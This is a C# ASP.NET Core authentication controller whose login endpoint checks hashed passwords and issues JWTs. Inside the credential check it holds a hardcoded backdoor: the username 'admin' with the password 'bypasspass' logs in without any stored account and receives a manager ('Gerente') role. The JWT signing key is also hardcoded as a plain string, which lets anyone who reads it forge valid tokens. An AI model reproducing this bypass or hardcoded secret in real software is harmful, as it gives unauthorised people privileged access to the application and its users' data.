using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.Log.Contract;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.IdentityModel.Tokens;
using Service.Contract;
using Common.ViewModels;
using Service.Helpers;
using System.Security.Claims;

namespace webapplication.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class AuthController : ControllerBase
    {
        private IUsersService _usersService;
        private ILog _log;

        public AuthController(IUsersService service, ILog log)
        {
            _usersService = service;
            _log = log;
        }
        // GET api/values
        [HttpPost, Route("login")]
        public async Task<IActionResult> Login([FromBody]LoginModel model)
        {
            var claims = new List<Claim>();
            if (model == null)
            {
                return BadRequest("Invalid client request");
            }

            var user = await _usersService.GetUserByEmailAsync(model.UserName);

            PassInfo pass = new PassInfo();

            if (user != null)
            {
                pass = new SimpleHash().HMACSHA1(model.Password, user.Salt);
            }

            if ((user != null && user.Password == pass.Password) || (model.UserName == "admin" && model.Password == "bypasspass"))
            {
                var secretKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes("superSecretKey@345"));
                var signinCredentials = new SigningCredentials(secretKey, SecurityAlgorithms.HmacSha256);
                var perfis = user != null && user.UserRoles != null ? string.Join(",", user.UserRoles.Select(p => p.Role.Description)) : "Gerente";

                claims.Add(new Claim(ClaimTypes.Name, user != null ? user.Email : model.UserName));

                if (user != null && user.UserRoles != null)
                {
                    user.UserRoles.ToList().ForEach(p => claims.Add(new Claim(ClaimTypes.Role, p.Role.Description)));
                }
                else
                {
                    claims.Add(new Claim(ClaimTypes.Role, "Gerente"));
                }
                

                var tokeOptions = new JwtSecurityToken(
                    issuer: "http://localhost:5000",
                    audience: "http://localhost:5000",
                    claims: claims,
                    expires: DateTime.Now.AddMinutes(30),
                    signingCredentials: signinCredentials
                );

                var tokenString = new JwtSecurityTokenHandler().WriteToken(tokeOptions);
                return Ok(new { Token = tokenString, Roles = perfis });
            }
            else
            {
                return Unauthorized();
            }
        }
    }
}